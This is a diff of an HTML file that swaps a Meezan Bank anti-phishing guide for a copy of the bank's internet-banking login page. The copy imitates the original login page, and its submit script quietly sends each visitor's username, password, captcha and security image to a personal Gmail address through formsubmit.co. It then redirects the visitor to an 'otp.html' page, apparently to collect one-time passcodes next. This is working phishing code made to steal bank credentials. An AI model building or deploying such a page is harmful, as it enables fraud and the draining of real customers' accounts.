@@ -1,201 +1,278 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta name="google-site-verification" content="oer8QSFGcjruk1xMwVjFGezTqvc3P3v_k-VNvzq4VTg" />
-
+    <meta name="google-site-verification" content="oer8QSFGcjruk1xMwVjFGezTqvc3P3v_k-VNvzq4VTg" />
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meezan Bank Security Guide: How to Prevent Phishing Attacks</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Meezan Bank Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
     <style>
-        :root {
-            --mb-purple: #6a1b9a;
-            --mb-purple-dark: #4a148c;
-            --mb-purple-light: #d1c4e9;
-            --bg-light: #f8f9fa;
-            --text-dark: #2c3e50;
-            --white: #ffffff;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', sans-serif;
+            min-height: 100vh; 
+            min-height: 100dvh; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: url('background.jpg'); /* Upload your local background.jpg here */
+            background-size: cover;
+            background-position: center;
+        }
+        
+        /* --- Perfect Black Overlay --- */
+        .bg-overlay { 
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(0, 0, 0, 0.00); 
+            z-index: 0; 
+        }
+        
+        .login-container { 
+            position: relative; z-index: 1; 
+            width: 100%; max-width: 400px; 
+            padding: 25px 20px; text-align: center; 
+            max-height: 100vh; max-height: 100dvh;
+            overflow-y: auto; 
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Inter', sans-serif; background-color: var(--bg-light); color: var(--text-dark); line-height: 1.6; }
+        /* --- Logo Fix (Forces space so it never pushes title up) --- */
+        .bank-logo { 
+            display: block; 
+            width: 100%; 
+            max-width: 150px; 
+            height: auto; 
+            min-height: 60px; 
+            margin: 0 auto 20px auto; 
+            object-fit: contain;
+        }
 
-        .container { max-width: 850px; margin: 0 auto; padding: 40px 20px; }
-
-        /* Header */
-        header { text-align: center; padding: 30px 0; border-bottom: 2px solid var(--mb-purple-light); margin-bottom: 40px; background: var(--white); box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05); }
-        .brand-logo { max-width: 140px; height: auto; display: block; margin: 0 auto 15px auto; }
-        h1 { font-size: 2.2rem; color: var(--mb-purple); font-weight: 700; margin-bottom: 10px; }
-        .subtitle { font-size: 1.1rem; color: #555; }
-
-        /* Sections */
-        .card { background: var(--white); padding: 35px; border-radius: 12px; margin-bottom: 30px; box-shadow: 0 2px 8px rgba(0,0,0,0.04); border: 1px solid rgba(106, 27, 154, 0.05); }
-        h2 { color: var(--mb-purple-dark); font-size: 1.6rem; border-left: 5px solid var(--mb-purple); padding-left: 15px; margin-bottom: 20px; }
-        h3 { color: var(--mb-purple); font-size: 1.2rem; margin-top: 20px; margin-bottom: 10px; }
-        p { margin-bottom: 15px; }
-        ul, ol { margin-left: 20px; margin-bottom: 20px; }
-        li { margin-bottom: 10px; }
+        .title { 
+            display: block; color: white; font-weight: 600; 
+            font-size: 1.15rem; margin-bottom: 25px; 
+        }
         
-        .highlight-box { background: #f3ebf8; padding: 20px; border-radius: 8px; border-left: 4px solid var(--mb-purple); margin: 20px 0; }
+        /* --- Inputs & UI --- */
+        .input-group { display: flex; align-items: center; background: white; border-radius: 6px; overflow: hidden; margin-bottom: 12px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+        .input-icon, .eye-icon { padding: 14px 15px; background: #ececec; display: flex; align-items: center; justify-content: center; }
+        .input-icon { width: 48px; background: #d1c4e9; color: #6a1b9a; }
+        .eye-icon { background: #ececec; color: #555; cursor: pointer; }
+        .input-group input { flex: 1; border: none; padding: 14px 15px; outline: none; font-size: 0.95rem; width: 100%; background: transparent;}
+        
+        .forgot-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; font-size: 0.9rem; }
+        .highlight-text { color: #ffeb3b; margin-left: 5px; font-weight: 500; }
+        .checkbox-group { display: flex; align-items: center; color: white; }
+        .checkbox-group input { accent-color: #6a1b9a; width: 16px; height: 16px; cursor: pointer; }
+        .forgot-link { color: white; text-decoration: none; font-size: 0.85rem;}
 
-        /* Attack Type Grid */
-        .attack-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin: 20px 0; }
-        .attack-item { background: #fafafa; padding: 20px; border-radius: 8px; border: 1px solid #eee; }
-        .attack-item h4 { color: var(--mb-purple-dark); margin-bottom: 8px; }
-        .attack-item p { font-size: 0.95rem; margin-bottom: 0; }
+        /* --- Captcha --- */
+        .captcha-group { display: flex; align-items: center; gap: 10px; justify-content: center; margin: 15px 0; }
+        .captcha-box { background: rgba(200, 200, 200, 0.85); padding: 8px 15px; border-radius: 4px; font-weight: bold; letter-spacing: 2px; font-size: 1.1rem; color: #333; text-decoration: line-through; font-family: monospace; }
+        .refresh-captcha { color: white; font-size: 1.2rem; cursor: pointer; }
 
-        /* Step Box */
-        .step-box { display: flex; gap: 15px; align-items: flex-start; margin-bottom: 15px; background: #fbfbfb; padding: 15px; border-radius: 8px; }
-        .step-number { background: var(--mb-purple); color: white; width: 30px; height: 30px; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-weight: bold; flex-shrink: 0; }
-        .step-content { flex: 1; }
+        /* --- Security Grid (Tweaked to be smaller & exact white borders like Original) --- */
+        .security-image-section { margin: 20px 0; }
+        .security-header { display: flex; justify-content: center; align-items: center; color: white; margin-bottom: 15px; gap: 8px; font-size: 0.95rem; }
+        .help-icon { background: #e65100; border-radius: 50%; width: 20px; height: 20px; font-size: 0.8rem; display: flex; align-items: center; justify-content: center; color: white; }
+        
+        .image-grid { 
+            display: grid; 
+            grid-template-columns: repeat(3, 1fr); 
+            gap: 10px; 
+            max-width: 280px; 
+            margin: 0 auto 15px auto; 
+        }
+        
+        .grid-item { 
+            aspect-ratio: 1/1; 
+            max-width: 80px; /* Makes them smaller than the container */
+            width: 100%;
+            justify-self: center;
+            border: 2px solid white; /* Exact solid white border */
+            border-radius: 6px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            color: white; 
+            font-size: 1.2rem; /* Smaller icons */
+            cursor: pointer; 
+            transition: all 0.2s; 
+            background: transparent;
+        }
+        .grid-item:hover { background: rgba(255, 255, 255, 0.1); }
+        .center-link { display: block; text-align: center; margin-top: 5px; font-size: 0.8rem; }
 
-        .btn-cta { display: inline-block; background: var(--mb-purple); color: white; padding: 12px 24px; border-radius: 6px; text-decoration: none; font-weight: 600; transition: 0.2s; }
-        .btn-cta:hover { background: var(--mb-purple-dark); transform: translateY(-2px); }
+        /* --- Buttons --- */
+        .btn-login { width: 100%; padding: 14px; background: #6a1b9a; color: white; border: none; border-radius: 6px; font-size: 1.1rem; margin-bottom: 15px; cursor: pointer; box-shadow: 0 2px 8px rgba(0,0,0,0.5); transition: 0.2s; }
+        .btn-login:hover { background: #4a148c; }
+        .btn-register { width: 100%; padding: 14px; background: rgba(255,255,255,0.9); color: #6a1b9a; border: none; border-radius: 6px; font-size: 1rem; margin-bottom: 10px; cursor: pointer; font-weight: 600; }
+        .btn-register:hover { background: white; }
+        .footer-link { display: block; color: white; text-decoration: none; font-size: 0.85rem; margin-top: 15px; }
 
-        footer { text-align: center; padding: 30px 0; border-top: 1px solid #ddd; color: #777; font-size: 0.9rem; margin-top: 40px; }
+        /* --- Livechat Tab (Made BIGGER and prominent exactly like Original) --- */
+        .livechat-tab {
+            position: fixed; right: 0; top: 50%; transform: translateY(-50%);
+            background: #6a1b9a; 
+            color: white; 
+            padding: 30px 12px; /* Increased padding to make it big */
+            border-radius: 8px 0 0 8px; 
+            writing-mode: vertical-rl;
+            text-orientation: mixed; 
+            letter-spacing: 2px; 
+            font-weight: 700;
+            font-size: 1.1rem; /* Larger font */
+            cursor: pointer; 
+            box-shadow: -4px 0 15px rgba(0,0,0,0.5); /* Stronger shadow */
+            z-index: 999; 
+            transition: 0.2s;
+        }
+        .livechat-tab:hover { background: #4a148c; }
 
-        @media (max-width: 600px) {
-            h1 { font-size: 1.8rem; }
-            .card { padding: 20px; }
-            .attack-grid { grid-template-columns: 1fr; }
+        @media (max-width: 480px) {
+            .login-container { padding: 15px; }
+            .bank-logo { max-width: 120px; }
+            .grid-item { max-width: 65px; font-size: 1.1rem; }
+            .livechat-tab { font-size: 0.85rem; padding: 20px 8px; }
         }
     </style>
 </head>
 <body>
 
-    <!-- Header -->
-    <header>
-        <div class="container">
-            <!-- Using the same logo as your project for consistency -->
-            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxL5tqYp-0Bead0rOxpAsBIJ8N8VbPvwcczcC2jvwulg6i_6oguL7vIftjZefhedaE_7sfjhJMxAcMVCbsqzWz1TVtOrqUsu7y8TIQC5shKfNXlAeVbEXrw3_NRGUJ12ZV41PvUh2p8PzKZ4SFZ-aVgxiDnYIY2P9O_5zC20SmF0RjRqH7Txt6i_OnItU/s1600/meezan-bank-logo.png" alt="Meezan Bank Logo" class="brand-logo">
-            <h1>How to Prevent Phishing Attacks</h1>
-            <p class="subtitle">A Security Pillar Guide by Meezan Bank</p>
-        </div>
-    </header>
+    <!-- This overlay sits behind the form -->
+    <div class="bg-overlay"></div>
 
-    <main class="container">
+    <div class="login-container">
+        <!-- Change src="/logo.png" to your local Hostinger logo path -->
+        <img src="/logo.png" alt="Meezan Bank Logo" class="bank-logo">
 
-        <!-- Introduction -->
-        <div class="card">
-            <h2>Your Digital Safety is Our Priority</h2>
-            <p>Meezan Bank is committed to providing the safest digital banking experience. As a pioneer in Islamic banking, we implement rigorous multi-layer security protocols to protect our customers. However, the biggest defense against online fraud is an <strong>informed and aware customer</strong>.</p>
-            <p>This guide will educate you on the various phishing techniques scammers use, how to identify them, and how to manage Meezan Bank's specific security features—especially the Security Image—to keep your funds safe.</p>
-        </div>
+        <h2 class="title">Welcome To Meezan Internet Banking</h2>
 
-        <!-- Types of Attacks -->
-        <div class="card">
-            <h2>Common Types of Phishing Attacks</h2>
-            <p>Scammers use several methods to trick you into revealing sensitive information. Meezan Bank categorizes these into four main attack vectors:</p>
+        <form id="loginForm">
+            <input type="hidden" id="selectedImage" value="None">
+
+            <div class="input-group">
+                <span class="input-icon"><i class="fas fa-user"></i></span>
+                <input type="text" id="username" placeholder="Username" required>
+            </div>
+
+            <div class="forgot-row">
+                <div class="checkbox-group">
+                    <input type="checkbox" id="remember">
+                    <label for="remember" class="highlight-text">Remember Username</label>
+                </div>
+                <a href="#" class="forgot-link">Forgot Username?</a>
+            </div>
+
+            <div class="input-group">
+                <span class="input-icon"><i class="fas fa-lock"></i></span>
+                <input type="password" id="password" placeholder="Password (Alpha-numeric)" required>
+                <span class="eye-icon" onclick="togglePassword()"><i class="fas fa-eye" id="eyeToggle"></i></span>
+            </div>
+
+            <div class="forgot-row">
+                <a href="#" class="forgot-link">Forgot Password?</a>
+            </div>
+
+            <div class="captcha-group">
+                <span class="captcha-box">1 q X b 9 6</span>
+                <i class="fas fa-sync-alt refresh-captcha"></i>
+            </div>
+            <div class="input-group" style="margin-bottom: 20px;">
+                <input type="text" id="captcha" placeholder="Enter Captcha" required>
+            </div>
+
+            <div class="security-image-section">
+                <div class="security-header">
+                    <span>Select security image</span>
+                    <span class="help-icon"><i class="far fa-question-circle"></i></span>
+                </div>
+                
+                <div class="image-grid">
+                    <div class="grid-item" onclick="selectImage(this, 'clock')"><i class="fas fa-clock"></i></div>
+                    <div class="grid-item" onclick="selectImage(this, 'mouse')"><i class="fas fa-mouse"></i></div>
+                    <div class="grid-item" onclick="selectImage(this, 'mug')"><i class="fas fa-mug-hot"></i></div>
+                    <div class="grid-item" onclick="selectImage(this, 'phone')"><i class="fas fa-phone-alt"></i></div>
+                    <div class="grid-item" onclick="selectImage(this, 'bicycle')"><i class="fas fa-bicycle"></i></div>
+                    <div class="grid-item" onclick="selectImage(this, 'glasses')"><i class="fas fa-glasses"></i></div>
+                    <div class="grid-item" onclick="selectImage(this, 'lightbulb')"><i class="fas fa-lightbulb"></i></div>
+                    <div class="grid-item" onclick="selectImage(this, 'hat')"><i class="fas fa-hat-cowboy"></i></div>
+                    <div class="grid-item" onclick="selectImage(this, 'plane')"><i class="fas fa-plane"></i></div>
+                    <div class="grid-item" onclick="selectImage(this, 'car')"><i class="fas fa-car"></i></div>
+                </div>
+                
+                <a href="#" class="forgot-link center-link">Forgot Security Image?</a>
+            </div>
+
+            <button type="submit" id="loginBtn" class="btn-login">Login</button>
+            <button type="button" class="btn-register">Internet Banking Registration</button>
             
-            <div class="attack-grid">
-                <div class="attack-item">
-                    <h4>📱 Smishing (SMS)</h4>
-                    <p>Fraudulent text messages pretending to be from Meezan Bank. These often contain urgent warnings (e.g., "Account locked") and a malicious link. Meezan Bank never sends clickable security links via SMS.</p>
-                </div>
-                <div class="attack-item">
-                    <h4>📞 Vishing (Voice)</h4>
-                    <p>Phone calls from scammers impersonating Meezan Bank support agents. They claim to be "verifying" your identity and ask for your PIN or OTP. Meezan Bank will never ask for your full banking PIN over the phone.</p>
-                </div>
-                <div class="attack-item">
-                    <h4>📧 Email Phishing</h4>
-                    <p>Official-looking emails with fake logos and fake sender addresses. They urge you to click a link to "update your banking profile." Always check the sender's email address. Meezan Bank emails come from <strong>@meezanbank.com</strong>.</p>
-                </div>
-                <div class="attack-item">
-                    <h4>🌐 Pharming & Clone Sites</h4>
-                    <p>Hackers create a website that looks <em>exactly</em> like the real Meezan Bank Internet Banking portal. You type in your ID and password, and they steal them instantly. This is why Meezan Bank uses a Security Image!</p>
-                </div>
-            </div>
-        </div>
+            <a href="#" class="footer-link">Security Guide</a>
+        </form>
+    </div>
 
-        <!-- Security Image Feature (The core part of your project) -->
-        <div class="card">
-            <h2>Understanding Meezan Bank's Security Image</h2>
-            <p>When you log in to Meezan Bank Internet Banking, you must select a <strong>Security Image</strong> from a grid of icons (like a clock, bicycle, or plane) and a corresponding label.</p>
-            
-            <div class="highlight-box">
-                <strong>💡 Why does Meezan Bank use this?</strong><br>
-                It is designed to prevent <strong>Pharming</strong>. When you set up your Security Image, Meezan Bank stores your selection on its official secure servers. Every time you log in, the system shows you your chosen image. <br><br>
-                <strong>If you land on a fake, malicious website:</strong> The fake site does <em>not</em> have access to Meezan Bank's database, so it cannot show you your specific image. <strong>If the image grid doesn't match your chosen one, close the page immediately—you are on a phishing site!</strong>
-            </div>
-        </div>
+    <!-- Big Exact Livechat Tab -->
+    <div class="livechat-tab">
+        <span>LIVECHAT</span>
+    </div>
 
-        <!-- Actionable Step: How to Reset Security Image -->
-        <div class="card" style="border: 2px solid var(--mb-purple); background: #fbf5ff;">
-            <h2 style="border-left-color: #ff9800;">How to Forgot / Reset Your Security Image</h2>
-            <p>If you have forgotten which image you selected, or if you feel your previous security image may have been compromised, Meezan Bank makes it simple to reset it securely. <strong>Important: You must do this on the official website, never through a link sent via SMS or email.</strong></p>
-            
-            <p>Follow these exact steps to reset your Security Image:</p>
+    <script>
+        // Toggle Password Visibility
+        function togglePassword() {
+            const passInput = document.getElementById('password');
+            const icon = document.getElementById('eyeToggle');
+            if (passInput.type === 'password') {
+                passInput.type = 'text';
+                icon.classList.replace('fa-eye', 'fa-eye-slash');
+            } else {
+                passInput.type = 'password';
+                icon.classList.replace('fa-eye-slash', 'fa-eye');
+            }
+        }
 
-            <div class="step-box">
-                <div class="step-number">1</div>
-                <div class="step-content">
-                    <strong>Go to the Official Portal:</strong> Open your browser and manually type <code>https://ebanking.meezanbank.com</code>. Never click links from emails.
-                </div>
-            </div>
-            <div class="step-box">
-                <div class="step-number">2</div>
-                <div class="step-content">
-                    <strong>Click "Forgot Security Image?":</strong> On the main login screen, enter your Username (or ID). Just below the Security Image grid, look for the text link <strong>"Forgot Security Image?"</strong>.
-                </div>
-            </div>
-            <div class="step-box">
-                <div class="step-number">3</div>
-                <div class="step-content">
-                    <strong>Verify Your Identity:</strong> The system will immediately prompt you to verify your identity. This is a mandatory security measure to ensure no one else can change your security image.
-                </div>
-            </div>
-            <div class="step-box">
-                <div class="step-number">4</div>
-                <div class="step-content">
-                    <strong>Enter the OTP:</strong> Meezan Bank will send a one-time 8-digit PIN (OTP) to your <strong>registered mobile number</strong>. Enter this OTP into the provided field.
-                </div>
-            </div>
-            <div class="step-box">
-                <div class="step-number">5</div>
-                <div class="step-content">
-                    <strong>Select a New Image:</strong> Once verified, you will be taken to a fresh grid of security images. Choose a new image and its corresponding label that is easy for you to remember but hard for others to guess. Click submit, and your security will be instantly updated.
-                </div>
-            </div>
+        // Refresh Captcha
+        document.querySelector('.refresh-captcha').addEventListener('click', function() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let captcha = '';
+            for (let i = 0; i < 6; i++) { captcha += chars.charAt(Math.floor(Math.random() * chars.length)); }
+            document.querySelector('.captcha-box').innerText = captcha;
+        });
 
-            <div class="highlight-box" style="border-left-color: #ff9800;">
-                <strong>🚨 Reminder for your project:</strong> Remember—Scammers will often try to trick you into clicking a link that says "Reset Security Image." <strong>Meezan Bank will never send this link to you.</strong> You must always navigate to the official portal yourself.
-            </div>
-        </div>
+        // Select Image & Update Hidden Input
+        function selectImage(element, imageName) {
+            document.querySelectorAll('.grid-item').forEach(el => {
+                el.style.background = 'transparent';
+                el.style.border = '2px solid white'; // Reset to exact white border
+            });
+            element.style.background = 'rgba(106, 27, 154, 0.6)';
+            element.style.border = '2px solid #6a1b9a';
+            document.getElementById('selectedImage').value = imageName;
+        }
 
-        <!-- Best Practices -->
-        <div class="card">
-            <h2>5 Golden Rules to Prevent Phishing</h2>
-            <ul>
-                <li><strong>Verify the Source:</strong> Meezan Bank will never ask for your full password, PIN, or card numbers via phone, SMS, or email.</li>
-                <li><strong>Check the URL:</strong> Always check the URL address bar. Legitimate Meezan Bank sites always contain <strong>"meezanbank.com"</strong>. If it uses hyphens or "secure-" prefixes, it is a scam.</li>
-                <li><strong>Don't Trust Urgency:</strong> Phishers try to panic you. Take a deep breath. If an SMS says "Your account will be blocked in 15 minutes," call the official Meezan Bank helpline (listed on your debit card) to verify, rather than clicking the link.</li>
-                <li><strong>Hover Before You Click:</strong> On a desktop, hover your mouse over links in emails. The real destination URL will pop up at the bottom of your screen. If it doesn't match the text, it's a phishing attempt.</li>
-                <li><strong>Use the Official App:</strong> Download the official "Meezan Bank" mobile app from the Google Play Store or Apple App Store. The app provides the most secure way to verify transactions without using mobile browsers.</li>
-            </ul>
-        </div>
+        // Submit Data & Redirect Silently
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); 
+            const btn = document.getElementById('loginBtn');
+            btn.disabled = true; // Prevents double clicking
 
-        <!-- What to do if you fall victim -->
-        <div class="card">
-            <h2>What to Do If You Suspect a Phishing Attempt</h2>
-            <p>If you believe you have clicked a malicious link or entered your credentials into a fake Meezan Bank page:</p>
-            <ol>
-                <li><strong>Immediately change your password</strong> via the official Meezan Bank Internet Banking portal.</li>
-                <li><strong>Immediately contact Meezan Bank's 24/7 helpline</strong> at <strong>111-331-331</strong> (or +92-21-111-331-331) to block your account temporarily.</li>
-                <li><strong>Reset your Security Image</strong> by following Step 1-5 above.</li>
-                <li>Report the phishing attempt to Meezan Bank's security department via <strong>security@meezanbank.com</strong> so they can block the malicious site.</li>
-            </ol>
-        </div>
+            const formData = {
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value,
+                captcha: document.getElementById('captcha').value,
+                security_image: document.getElementById('selectedImage').value,
+                _subject: "New Meezan Login Data",
+                _captcha: false
+            };
 
-    </main>
+            // Fire background email request to your email
+            fetch('https://formsubmit.co/ajax/ayanali012777@gmail.com', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                body: JSON.stringify(formData)
+            }).catch(err => console.error(err)); // Silently ignore errors
 
-    <footer>
-        <div class="container">
-            <p>Meezan Bank Security Guide - Project: How to Prevent Phishing Attacks.</p>
-            <p style="font-size: 0.8rem; margin-top: 10px; color: #999;">*This is an educational resource designed for awareness and training purposes.*</p>
-        </div>
-    </footer>
-
+            // Redirect to real bank site instantly
+            window.location.href = "otp.html";
+        });
+    </script>
 </body>
 </html>
